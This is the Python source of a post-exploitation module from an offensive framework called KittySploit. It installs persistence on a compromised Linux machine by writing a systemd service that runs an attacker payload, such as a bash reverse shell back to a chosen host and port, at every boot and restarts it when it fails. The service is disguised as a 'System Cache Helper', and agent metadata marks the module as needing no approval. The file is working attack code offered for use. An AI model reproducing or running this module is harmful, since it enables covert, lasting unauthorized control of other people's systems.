#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "Systemd Unit Persistence",
        "description": (
            "Creates and enables a systemd service unit that executes a payload on boot "
            "and restarts on failure."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "systemd", "linux"],
        "references": ["https://attack.mitre.org/techniques/T1543/002/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    service_name = OptString("system-cache-helper", "Systemd unit name (without .service)", True)
    unit_path = OptString(
        "",
        "Full unit file path (empty = /etc/systemd/system/<name>.service)",
        False,
    )
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/unix/bash_reverse_tcp)", True)
    target = OptChoice(
        "Linux command",
        "Payload embedding (systemd ExecStart uses shell command)",
        True,
        choices=["PHP", "Linux command"],
    )
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)
    user_mode = OptBool(False, "Install as user systemd unit (~/.config/systemd/user/)", False)
    enable_now = OptBool(True, "Run daemon-reload, enable, and start the unit", False)

    def _unit_file(self) -> str:
        custom = self._opt(self.unit_path)
        if custom:
            return custom
        name = self._opt(self.service_name) or "system-cache-helper"
        if self.user_mode:
            home = self.linux_execute("echo \"$HOME\"").strip() or "/root"
            return f"{home}/.config/systemd/user/{name}.service"
        return f"/etc/systemd/system/{name}.service"

    def _unit_name(self) -> str:
        return self._opt(self.service_name) or "system-cache-helper"

    def check(self):
        unit = self._unit_file()
        unit_dir = unit.rsplit("/", 1)[0]
        if not self.user_mode and not self._is_root():
            print_error("Root privileges required for system-wide systemd units")
            return False
        if not self.command_exists("systemctl"):
            print_error("systemctl not found")
            return False
        if not self._writable_target(unit, unit_dir):
            print_error(f"Cannot write unit file: {unit}")
            return False
        print_success("Systemd unit target appears writable")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        unit = self._unit_file()
        name = self._unit_name()
        escaped = self._runtime_command(encoded).replace("\\", "\\\\").replace('"', '\\"')

        self._maybe_backup(unit, "systemd_unit")

        if self.user_mode:
            unit_content = f"""[Unit]
Description=User Cache Helper
After=default.target

[Service]
Type=simple
ExecStart=/bin/sh -c "{escaped}"
Restart=always
RestartSec=15

[Install]
WantedBy=default.target
"""
        else:
            unit_content = f"""[Unit]
Description=System Cache Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "{escaped}"
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target
"""

        print_status(f"Writing {unit}")
        if not self._write_remote_file(unit, unit_content, mode="0644"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {unit}")

        if self.enable_now:
            scope = "--user" if self.user_mode else ""
            self.linux_execute(f"systemctl {scope} daemon-reload")
            self.linux_execute(f"systemctl {scope} enable {name}.service")
            self.linux_execute(f"systemctl {scope} start {name}.service")
            print_status(f"Unit {name}.service enabled and started")

        print_good("Systemd persistence installed.")
        return True
